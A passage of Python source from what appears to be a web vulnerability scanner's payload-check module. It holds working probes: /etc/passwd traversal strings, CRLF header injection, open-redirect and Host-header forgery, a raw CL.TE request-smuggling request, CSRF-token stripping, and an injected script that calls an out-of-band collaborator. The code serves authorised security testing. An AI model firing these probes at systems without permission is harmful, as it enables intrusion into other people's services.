"""Payload checks (Phase 2A) — single-request/response DAST checks, driven
by queries/dynamic_queries.json. Scenario checks (multi-step, stateful) land
in Phase 2B with their own runner; these are deliberately the simpler kind.
"""
import asyncio
import logging
import re
import secrets
import socket
import ssl
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urljoin, urlsplit, urlunsplit

import httpx

from app.domain.analysis.dast.collaborator import CollaboratorServer
from app.domain.analysis.dast.findings import DynamicFinding
from app.domain.analysis.dast.oracles import (
    canary,
    canary_reflected_unescaped,
    error_signature_oracle,
    oob_oracle,
    response_diff_oracle,
    timing_oracle,
)
from app.domain.analysis.dast.rule_loader import DynamicQueryRule, load_dynamic_queries
from app.domain.analysis.dast.session import DastSession
from app.domain.analysis.dast.verdict import Verdict

logger = logging.getLogger(__name__)

_BLOCKED_STATUS_CODES = {400, 403, 404}
_REDIRECT_STATUS_CODES = {301, 302, 303, 307, 308}
# See _check_unauthenticated_access's docstring comment — paths whose whole
# purpose is letting an unauthenticated visitor establish a new session or
# recover access to one, so they can never meaningfully require an existing
# session as a prerequisite. Deliberately excludes /me, /logout, /profile,
# etc. — those can and often do legitimately require auth.
_PUBLIC_BY_DEFINITION_PATH_RE = re.compile(
    r"/(login|log-in|signin|sign-in|register|signup|sign-up|"
    r"forgot-password|reset-password|password-reset|password/reset)$",
    re.IGNORECASE,
)
# Real response evidence — enough to show a reader real data actually came
# back (an admin list, a reflected payload, an error signature), not so
# much that a report balloons on a large JSON body.
_UNAUTH_RESPONSE_SNIPPET_CHARS = 500


def _response_proof(session: DastSession, resp: httpx.Response, **extra) -> dict:
    """Shared evidence builder for every check below, every verdict —
    previously only a handful of FAIL/CONFIRMED branches captured any real
    response data at all, so a PASS verdict ("we tested and it's fine")
    had to be taken on faith with no way to see what was actually sent or
    received. url/status/snippet apply to any httpx.Response; **extra lets
    a specific check attach its own additional fields (timing deltas, a
    matched error signature, etc.) into the same dict rather than a
    separate ad-hoc shape per check."""
    proof = {
        "request_url": session.redact(str(resp.request.url)),
        "status": resp.status_code,
        "response_snippet": session.redact(resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
    }
    proof.update({k: (session.redact(v) if isinstance(v, str) else v) for k, v in extra.items()})
    return proof

# Same regex weight class as crawler.py — good enough to find *a* state-changing
# form and its fields, not a full HTML parser.
_FORM_TAG_RE = re.compile(r'<form\b([^>]*)>(.*?)</form>', re.IGNORECASE | re.DOTALL)
_FORM_ACTION_ATTR_RE = re.compile(r'action=["\']([^"\']*)["\']', re.IGNORECASE)
_FORM_METHOD_ATTR_RE = re.compile(r'method=["\']([^"\']*)["\']', re.IGNORECASE)
_INPUT_TAG_RE = re.compile(r'<input\b[^>]*>', re.IGNORECASE)
_INPUT_ATTR_RE = re.compile(r'([\w-]+)\s*=\s*["\']([^"\']*)["\']')
_STATE_CHANGING_METHODS = {"POST", "PUT", "PATCH", "DELETE"}
_CSRF_NAME_HINTS = ("csrf", "xsrf", "authenticity_token", "requestverificationtoken")


def _build_url_with_param(url: str, param: str, value: str) -> str:
    """Same param-replacement job urljoin/urlencode already do elsewhere in
    this package (bridge.py's param-dependent bridge targets) — rebuilds
    `url` with `param` set to `value`, keeping every other existing query
    param untouched. Used by the confirmation-escalation paths below that
    need to hand a caller (a browser, a human pasting a reproduction) a
    complete URL rather than going through DastSession.request's params=
    merge behavior."""
    parts = urlsplit(url)
    params = parse_qs(parts.query, keep_blank_values=True)
    params[param] = [value]
    new_query = urlencode(params, doseq=True)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))


def _url_without_param(url: str, param: str) -> str:
    """Companion to _build_url_with_param — strips `param` out entirely
    rather than setting it, keeping every other existing query param
    untouched. Used where a check needs to control a param's exact
    representation itself (e.g. NoSQL injection's bracket-notation
    operator keys), which DastSession.request's params= merge (replace by
    key) can't express since the injected key is deliberately not the same
    string as the original param name."""
    parts = urlsplit(url)
    params = parse_qs(parts.query, keep_blank_values=True)
    params.pop(param, None)
    new_query = urlencode(params, doseq=True)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))


# Bug fix — the payload always targets /etc/passwd (see
# DOUBLE_DECODE_BYPASS's single_encoded_suffix/double_encoded_suffix in
# dynamic_queries.json), but _double_decode_verdict only ever compared
# STATUS CODES — never checked whether the "unblocked" double-encoded
# response body actually contains any file content. Against an SPA (nginx
# `try_files $uri /index.html`), a literal `..` traversal attempt gets
# blocked at the nginx layer (400) while the double-encoded,
# nginx-normalization-dodging version falls through to the SPA's catch-all
# — a 200 with the exact same generic index.html every unmatched route
# returns, not /etc/passwd's contents. That "different status code" alone
# was enough to claim FAIL, a confirmed false positive against a real
# target (2026-08-15 marketplace scan). root's passwd entry always has
# uid/gid 0:0 — a signature essentially impossible to hit by coincidence in
# an HTML/JSON response, so its presence is real, strong evidence, while
# its absence downgrades what would have been a confident FAIL to
# INCONCLUSIVE — the status-code discrepancy is still a real, worth-
# investigating anomaly, just not provable file disclosure.
_ETC_PASSWD_DISCLOSURE_RE = re.compile(r"root:[^\n:]*:0:0:")


def _looks_like_etc_passwd_disclosure(text: str) -> bool:
    return bool(_ETC_PASSWD_DISCLOSURE_RE.search(text))


def _double_decode_verdict(
    session: DastSession, control_id: str, rule: DynamicQueryRule, url_for_report: str,
    single_resp: httpx.Response, double_resp: httpx.Response,
) -> DynamicFinding:
    """Shared verdict logic for both request shapes _check_double_decode_bypass
    tries below (path-suffix and query-param-value) — the comparison itself
    (blocked-vs-not, both 404, identical, ambiguous) doesn't depend on which
    shape produced the two responses."""
    # Shared by every branch below — every verdict this check can reach
    # (not just FAIL) now carries the real status codes and response
    # bodies it compared, so a PASS can be verified the same way a FAIL
    # can, not just taken on faith.
    proof_both = {
        "single_encoded_status": single_resp.status_code,
        "double_encoded_status": double_resp.status_code,
        "single_encoded_response_snippet": session.redact(single_resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
        "double_encoded_response_snippet": session.redact(double_resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
    }
    if single_resp.status_code in _BLOCKED_STATUS_CODES and double_resp.status_code not in _BLOCKED_STATUS_CODES:
        if _looks_like_etc_passwd_disclosure(double_resp.text):
            return DynamicFinding(
                control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
                url=url_for_report, method="GET",
                note=f"Single-encoded request was blocked ({single_resp.status_code}) but the double-encoded "
                     f"equivalent returned {double_resp.status_code} with /etc/passwd content in the body — "
                     f"input is decoded more than once before validation",
                confidence=0.85, evidence_type="response_diff", proof=proof_both,
            )
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.INCONCLUSIVE, rule_id=rule.rule_id, severity=rule.severity,
            url=url_for_report, method="GET",
            note=f"Single-encoded request was blocked ({single_resp.status_code}) and the double-encoded "
                 f"equivalent returned {double_resp.status_code}, but its body doesn't contain /etc/passwd "
                 f"content — likely a catch-all route (SPA fallback, generic error page) rather than actual "
                 f"file disclosure; the status-code gap alone isn't proof of a decode bypass",
            confidence=0.3, evidence_type="response_diff", proof=proof_both,
        )
    if single_resp.status_code == double_resp.status_code == 404:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=url_for_report, method="GET",
            note="Both encodings returned 404 — no responding endpoint here to compare decode behavior against",
            confidence=0.25, evidence_type="response_diff", proof=proof_both,
        )
    if single_resp.status_code == double_resp.status_code:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
            url=url_for_report, method="GET",
            note=f"Single- and double-encoded requests were handled identically (both {single_resp.status_code})",
            confidence=0.6, evidence_type="response_diff", proof=proof_both,
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.INCONCLUSIVE, rule_id=rule.rule_id, severity=rule.severity,
        url=url_for_report, method="GET",
        note=f"Ambiguous result: single-encoded={single_resp.status_code}, double-encoded={double_resp.status_code}",
        confidence=0.3, evidence_type="response_diff", proof=proof_both,
    )


async def _check_double_decode_bypass(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    control_id = rule.asvs_controls[0]

    # File-by-name endpoints (very common real shape — /download?file=x,
    # /preview?file=x, both exist in this exact repo) take the traversal
    # target as a query param *value*, never as a path suffix — the
    # path-suffix-only version of this check (the branch below still runs
    # this way for routes with no query param) could never even reach that
    # code path, let alone test it. Same "test whatever param the bridge/
    # crawler-supplied URL already carries" strategy REFLECTED_XSS_LIVE and
    # SQL_INJECTION_LIVE use, not a guessed candidate-name list.
    query_params = parse_qs(urlsplit(target_url).query)
    if query_params:
        param = next(iter(query_params))
        base = target_url.split("?")[0]
        single_value = rule.single_encoded_suffix.lstrip("/")
        double_value = rule.double_encoded_suffix.lstrip("/")
        # Built as a literal query string, not session.request(params=...):
        # single_value/double_value are already percent-encoded strings
        # (that's the entire point of what's being compared) — httpx's
        # params= kwarg would percent-encode the literal "%" characters
        # themselves on top of that, silently promoting a "single-encoded"
        # request to double-encoded on the wire and "double" to triple.
        # Same reasoning the path-suffix branch below already follows by
        # concatenating the suffix directly into the URL.
        single_test_url = f"{base}?{param}={single_value}"
        double_test_url = f"{base}?{param}={double_value}"
        try:
            single_resp = await session.request("GET", single_test_url, follow_redirects=False)
            double_resp = await session.request("GET", double_test_url, follow_redirects=False)
        except Exception as exc:
            return DynamicFinding(
                control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
                url=target_url, method="GET",
                note=f"Request failed: {session.redact(str(exc))}", confidence=0.3,
            )
        return _double_decode_verdict(session, control_id, rule, str(double_resp.request.url), single_resp, double_resp)

    base = target_url.rstrip("/")
    single_url = base + rule.single_encoded_suffix
    double_url = base + rule.double_encoded_suffix

    try:
        single_resp = await session.request("GET", single_url, follow_redirects=False)
        double_resp = await session.request("GET", double_url, follow_redirects=False)
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=base, method="GET",
            note=f"Request failed: {session.redact(str(exc))}", confidence=0.3,
        )
    return _double_decode_verdict(session, control_id, rule, double_url, single_resp, double_resp)


async def _check_crlf_header_reflection(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    control_id = rule.asvs_controls[0]
    marker_value = f"dast-{secrets.token_hex(4)}"
    injected_header = "X-Dast-Probe"
    payload = f"https://example.org/\r\n{injected_header}: {marker_value}"

    observed_response = False
    attempted = False
    for param in rule.candidate_params:
        try:
            resp = await session.request("GET", target_url, params={param: payload}, follow_redirects=False)
        except Exception:
            continue
        attempted = True
        if resp.status_code == 404:
            continue
        observed_response = True
        reflected = resp.headers.get(injected_header.lower())
        if reflected and marker_value in reflected:
            return DynamicFinding(
                control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
                url=str(resp.request.url), method="GET",
                note=f"Marker header reflected literally via query param '{param}' — CRLF from user input "
                     f"reaches a response header unsanitized",
                confidence=0.75, payload=session.redact(payload), evidence_type="reflection",
                proof=_response_proof(session, resp, injected_header=injected_header, reflected_value=reflected, param=param),
            )

    if observed_response:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="No candidate redirect/reflection query parameter reflected the injected CRLF marker",
            confidence=0.55, payload=session.redact(payload), evidence_type="reflection",
            proof=_response_proof(session, resp, last_param_tried=param),
        )
    if attempted:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="No candidate query parameter was recognized by the target (all returned 404) — "
                 "crawler-discovered parameters (Phase 3) would widen this",
            confidence=0.2,
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method="GET",
        note="Could not reach the target with any candidate parameter",
        confidence=0.2,
    )


async def _check_open_redirect_live(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    control_id = rule.asvs_controls[0]
    canary = rule.canary_domain
    external_target = f"https://{canary}/"

    observed_response = False
    for param in rule.candidate_params:
        try:
            resp = await session.request("GET", target_url, params={param: external_target}, follow_redirects=False)
        except Exception:
            continue
        if resp.status_code == 404:
            continue
        observed_response = True
        if resp.status_code in _REDIRECT_STATUS_CODES:
            location = resp.headers.get("location", "")
            if canary in location:
                return DynamicFinding(
                    control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
                    url=str(resp.request.url), method="GET",
                    note=f"Param '{param}' drove an unvalidated redirect to the canary domain "
                         f"(Location: {session.redact(location)})",
                    confidence=0.8, payload=session.redact(external_target), evidence_type="response_diff",
                    proof=_response_proof(session, resp, redirect_location=location, param=param),
                )

    try:
        resp = await session.request("GET", target_url, headers={"Host": canary}, follow_redirects=False)
        if resp.status_code in _REDIRECT_STATUS_CODES:
            location = resp.headers.get("location", "")
            if canary in location:
                return DynamicFinding(
                    control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
                    url=target_url, method="GET",
                    note=f"A forged Host header reached a redirect Location unchanged "
                         f"({session.redact(location)})",
                    confidence=0.7, payload=f"Host: {canary}", evidence_type="response_diff",
                    proof=_response_proof(session, resp, redirect_location=location),
                )
    except Exception:
        pass

    if observed_response:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="No candidate redirect parameter or forged Host header produced an unvalidated external redirect",
            confidence=0.55, evidence_type="response_diff",
            proof=_response_proof(session, resp, last_param_tried=param),
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method="GET",
        note="No candidate redirect parameter was recognized by the target (no confirmed redirect endpoint)",
        confidence=0.25,
    )


def _parse_host_port_scheme(url: str) -> tuple:
    parts = urlsplit(url)
    is_https = parts.scheme == "https"
    port = parts.port or (443 if is_https else 80)
    path = parts.path or "/"
    return parts.hostname, port, is_https, path


def _send_raw_smuggling_probe(host: str, port: int, is_https: bool, payload: bytes) -> str:
    """Blocking raw-socket send/recv — run via asyncio.to_thread. httpx (like
    any well-behaved client) won't let us construct a request with a
    deliberately ambiguous Content-Length/Transfer-Encoding combination, so
    this bypasses it entirely, same rationale as dynamic_probe.py's raw TLS
    socket use for protocol-level checks httpx can't express either."""
    sock = socket.create_connection((host, port), timeout=8.0)
    try:
        if is_https:
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=host)
        sock.sendall(payload)
        sock.settimeout(4.0)
        chunks = []
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        except (socket.timeout, ssl.SSLError):
            pass
        return b"".join(chunks).decode("utf-8", errors="replace")
    finally:
        sock.close()


async def _check_request_smuggling(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    control_id = rule.asvs_controls[0]
    host, port, is_https, path = _parse_host_port_scheme(target_url)
    marker = f"dast-smuggle-{secrets.token_hex(4)}"

    # CL.TE-style ambiguity: Content-Length says the body is 4 bytes ("0\r\n"
    # doesn't match), but Transfer-Encoding: chunked says to read a chunked
    # body instead — a front-end/back-end pair that parse this differently
    # can end up treating the trailing marker request as part of the first
    # request's body, or the reverse. Either disagreement can leak the
    # marker into the wrong response.
    probe = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"0\r\n\r\n"
        f"GET /{marker} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    try:
        raw_response = await asyncio.wait_for(
            asyncio.to_thread(_send_raw_smuggling_probe, host, port, is_https, probe),
            timeout=10.0,
        )
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="RAW",
            note=f"Could not complete the smuggling probe: {session.redact(str(exc))}", confidence=0.2,
        )

    # No httpx.Response here (raw socket probe, not routed through
    # DastSession) — _response_proof doesn't apply, so this is built by
    # hand from the raw bytes sent/received instead.
    raw_proof = {
        "raw_probe_sent": session.redact(probe.decode(errors="replace")),
        "raw_response_snippet": session.redact(raw_response[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
        "marker": marker,
    }
    if marker in raw_response:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="RAW",
            note="An ambiguous Content-Length/Transfer-Encoding request caused a smuggled "
                 "follow-up request's marker to leak into the response — indicates the "
                 "server/proxy chain disagrees on request framing (best-effort indicator, "
                 "not a confirmed exploit chain)",
            confidence=0.6, evidence_type="response_diff", proof=raw_proof,
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method="RAW",
        note="No smuggled-request marker observed in the response to an ambiguous "
             "Content-Length/Transfer-Encoding request",
        confidence=0.45, evidence_type="response_diff", proof=raw_proof,
    )


def _extract_input_fields(form_body: str) -> Dict[str, str]:
    fields: Dict[str, str] = {}
    for tag_match in _INPUT_TAG_RE.finditer(form_body):
        attrs = dict(_INPUT_ATTR_RE.findall(tag_match.group(0)))
        name = attrs.get("name")
        if name:
            fields[name] = attrs.get("value", "")
    return fields


def _find_state_changing_form(html: str, base_url: str) -> Optional[Tuple[str, str, Dict[str, str]]]:
    for match in _FORM_TAG_RE.finditer(html):
        attrs, body = match.group(1), match.group(2)
        method_match = _FORM_METHOD_ATTR_RE.search(attrs)
        method = method_match.group(1).upper() if method_match else "GET"
        if method not in _STATE_CHANGING_METHODS:
            continue
        action_match = _FORM_ACTION_ATTR_RE.search(attrs)
        action_url = urljoin(base_url, action_match.group(1)) if action_match else base_url
        return method, action_url, _extract_input_fields(body)
    return None


async def _check_csrf_token_validation(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    """Phase 3 — V3.5.1. Fetches target_url, finds the first state-changing
    form containing a CSRF-token-shaped hidden field, then resubmits it with
    that field dropped. requires_active_mode in dynamic_queries.json because
    a genuinely unprotected form really does perform the action."""
    control_id = rule.asvs_controls[0] if rule.asvs_controls else rule.rule_id

    try:
        resp = await session.request("GET", target_url)
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note=f"Could not fetch the page to look for a form: {session.redact(str(exc))}", confidence=0.2,
        )
    if resp.status_code == 404 or "html" not in resp.headers.get("content-type", "html"):
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="Page was unreachable or not HTML — nothing to inspect for a CSRF-protected form",
            confidence=0.2,
        )

    form = _find_state_changing_form(resp.text, target_url)
    if form is None:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="No state-changing (POST/PUT/PATCH/DELETE) form found on this page to test",
            confidence=0.2,
        )
    method, action_url, fields = form
    csrf_field_name = next(
        (name for name in fields if any(hint in name.lower() for hint in _CSRF_NAME_HINTS)), None,
    )
    if csrf_field_name is None:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=action_url, method=method,
            note="Form has no CSRF-token-shaped hidden field — can't confirm or deny token validation this "
                 "way (the app may rely on SameSite cookies instead, which this check doesn't evaluate)",
            confidence=0.2,
        )

    tampered_data = {name: (value or "dast-probe-value") for name, value in fields.items() if name != csrf_field_name}
    try:
        tampered_resp = await session.request(method, action_url, data=tampered_data, follow_redirects=False)
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=action_url, method=method,
            note=f"Resubmitting the form without the token failed: {session.redact(str(exc))}", confidence=0.2,
        )

    csrf_proof = _response_proof(session, tampered_resp, csrf_field_dropped=csrf_field_name, tampered_data=str(tampered_data))
    if tampered_resp.status_code in (400, 401, 403, 419, 422):
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
            url=action_url, method=method,
            note=f"Submitting the form without '{csrf_field_name}' was rejected ({tampered_resp.status_code})",
            confidence=0.6, evidence_type="response_diff", proof=csrf_proof,
        )
    if tampered_resp.status_code < 400:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
            url=action_url, method=method,
            note=f"Submitting the form without '{csrf_field_name}' returned {tampered_resp.status_code} — "
                 f"the token doesn't appear to be validated server-side (a single test run; a session-bound "
                 f"SameSite cookie could still be providing real protection this check can't see)",
            confidence=0.6, evidence_type="response_diff", proof=csrf_proof,
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.INCONCLUSIVE, rule_id=rule.rule_id, severity=rule.severity,
        url=action_url, method=method,
        note=f"Ambiguous response to the tampered submission: {tampered_resp.status_code}",
        confidence=0.3, evidence_type="response_diff", proof=csrf_proof,
    )


async def _check_unauthenticated_access(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, method: str = "GET", collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    """Phase 3 — V8.2.1 forced-browsing/function-level access control. Requests
    target_url once through the scan's authenticated session, once with no
    credentials at all (DastSession.request_unauthenticated), and compares.
    Only meaningful when the scan actually configured an authenticated
    session — otherwise both requests would be the same request twice.

    method: the route's real HTTP method (run_payload_checks._METHOD_AWARE_
    CHECKS) — a POST-only route probed with the default GET always 405s
    before this check gets to compare anything meaningful. Sent with no
    body either way: this check only cares whether the route is reachable
    at all without auth, not whether a full/valid POST body would also
    succeed — a route that rejects a bodyless POST for both the
    authenticated and anonymous request still degrades honestly to
    NOT_TESTED below (same-status baseline check), never a false PASS/FAIL."""
    control_id = rule.asvs_controls[0] if rule.asvs_controls else rule.rule_id

    # Bug fix — login/register/password-recovery entry points MUST be
    # reachable without an existing session, by definition: there's no way
    # to establish a session at all if the endpoint that creates one
    # already requires one. Testing these the same way as a genuinely
    # protected resource always produced a FAIL — confirmed false positive
    # against a real target (2026-08-15 marketplace scan: GET /auth/login,
    # /auth/register both flagged). Deliberately narrow and NOT including
    # every /auth/* path — /auth/me and /auth/logout can legitimately
    # require authentication (this app's own logout route does, per
    # auth.routes.js's `authenticate` middleware on POST /auth/logout), so
    # suppressing those would hide a real finding rather than a false one.
    # Skipped with NOT_TESTED rather than silently dropped, so it stays
    # visible that this URL was deliberately not evaluated.
    path = urlsplit(target_url).path.rstrip("/")
    if _PUBLIC_BY_DEFINITION_PATH_RE.search(path):
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method=method,
            note="This path is a login/registration/password-recovery entry point — reachable without an "
                 "existing session by definition, not a meaningful test of access control",
            confidence=0.9,
        )

    if not session.is_authenticated:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_CONFIGURED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method=method,
            note="This scan has no authenticated session configured, so there's no authenticated baseline "
                 "to compare an anonymous request against",
            confidence=1.0,
        )

    try:
        authed_resp = await session.request(method, target_url, follow_redirects=False)
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method=method,
            note=f"Authenticated baseline request failed: {session.redact(str(exc))}", confidence=0.2,
        )
    if not (200 <= authed_resp.status_code < 300):
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method=method,
            note=f"Authenticated request itself returned {authed_resp.status_code} — no confirmed-reachable "
                 f"baseline to compare an anonymous request against",
            confidence=0.25, evidence_type="response_diff", proof=_response_proof(session, authed_resp),
        )

    try:
        anon_resp = await session.request_unauthenticated(method, target_url, follow_redirects=False)
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method=method,
            note=f"Anonymous request failed: {session.redact(str(exc))}", confidence=0.2,
        )

    # Shared by every branch from here — real data a reader can check for
    # themselves (an admin list, a health payload, or just "both 401'd"),
    # not just a status code claimed in prose. Capped/redacted the same way
    # every other evidence field this engine produces is.
    auth_proof = {
        "authenticated_status": authed_resp.status_code,
        "anonymous_status": anon_resp.status_code,
        "authenticated_response_snippet": session.redact(authed_resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
        "anonymous_response_snippet": session.redact(anon_resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
    }
    if anon_resp.status_code in (401, 403) or anon_resp.status_code in _REDIRECT_STATUS_CODES:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method=method,
            note=f"Anonymous request was denied/redirected ({anon_resp.status_code}) where the "
                 f"authenticated one succeeded ({authed_resp.status_code})",
            confidence=0.6, evidence_type="response_diff", proof=auth_proof,
        )
    if 200 <= anon_resp.status_code < 300:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method=method,
            note=f"Anonymous request also returned {anon_resp.status_code} — this endpoint doesn't appear "
                 f"to actually require authentication",
            confidence=0.65, evidence_type="response_diff", proof=auth_proof,
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.INCONCLUSIVE, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method=method,
        note=f"Ambiguous anonymous response: {anon_resp.status_code} "
             f"(authenticated response was {authed_resp.status_code})",
        confidence=0.3, evidence_type="response_diff", proof=auth_proof,
    )


_XSS_BROWSER_NAV_TIMEOUT_MS = 10_000
# Same reasoning as ssrf_probe.py's DEFAULT_CALLBACK_WAIT_SECONDS — the
# browser's own fetch() needs a moment to actually reach the collaborator
# after page load settles, not the instant page.goto() returns.
_XSS_BROWSER_CALLBACK_WAIT_SECONDS = 2.0


async def _confirm_reflected_xss_execution(
    target_url: str, param: str, collaborator: Optional[CollaboratorServer],
) -> Tuple[bool, dict, Optional[str]]:
    """Stage 2 of _check_reflected_xss. Stage 1 (canary_reflected_unescaped)
    only proves the marker reflects somewhere a browser *would* execute it;
    this proves it actually does, by handing a real headless browser
    (Playwright, same dependency browser_crawler.py already uses) a URL
    whose payload calls back a unique collaborator token via fetch() the
    moment it executes. A callback received is direct proof of JS
    execution — no interpretation of response text involved, the "impact
    reproduced" bar every CONFIRMED verdict requires (see oracles.py).

    Returns (confirmed, proof, reproduction). Gracefully degrades (returns
    not-confirmed, never raises) when there's no collaborator for this scan
    or Playwright/Chromium isn't available — same posture every other
    optional-browser code path in this engine takes.
    """
    if collaborator is None:
        return False, {"reason": "no out-of-band collaborator configured for this scan"}, None

    token = collaborator.new_token()
    callback_url = collaborator.callback_url(token)
    exec_payload = f'"><script>fetch("{callback_url}").catch(()=>{{}})</script>'
    exec_url = _build_url_with_param(target_url, param, exec_payload)

    try:
        from playwright.async_api import async_playwright
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True)
            try:
                page = await browser.new_page()
                try:
                    await page.goto(exec_url, wait_until="networkidle", timeout=_XSS_BROWSER_NAV_TIMEOUT_MS)
                except Exception:
                    # A navigation error (timeout, target closes the
                    # connection, ...) doesn't mean the payload didn't fire
                    # before that happened — still check the collaborator.
                    pass
                finally:
                    await page.close()
            finally:
                await browser.close()
    except Exception as exc:
        return False, {"reason": f"headless browser confirmation unavailable: {exc}"}, None

    await asyncio.sleep(_XSS_BROWSER_CALLBACK_WAIT_SECONDS)
    confirmed, proof = oob_oracle(collaborator, token)
    if not confirmed:
        proof["reason"] = "browser loaded the reflected payload but no out-of-band callback was observed"
        return False, proof, None
    reproduction = f"Open in a browser (payload executes on load and calls back out-of-band): {exec_url}"
    return True, proof, reproduction


async def _check_reflected_xss(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    """Track A1 — V1.2.1. Unlike OPEN_REDIRECT_LIVE/CRLF_HEADER_REFLECTION,
    reflected XSS has no small fixed universe of semantically-meaningful
    param names to guess blindly (a redirect param is almost always named
    next/redirect/url/...; a reflection sink could be any param at all) —
    guessing common names against every crawled URL would mostly just
    produce NOT_TESTED noise. Instead this only replays params the URL
    already carries (crawler-discovered query strings, e.g. /search?q=...),
    same marker-tag technique xss_probe.py uses for stored XSS.

    Two-stage probe (Phase 2.2 — this used to be a single naive
    `payload in resp.text` substring check, which is the check's largest
    false-positive source: plenty of harmless reflections match that test,
    e.g. inside an HTML-escaped attribute or a JSON string field):
      1. canary_reflected_unescaped pre-filters for a *dangerous* context
         (script block, event handler, unquoted attribute, raw tag
         break-out), not mere presence.
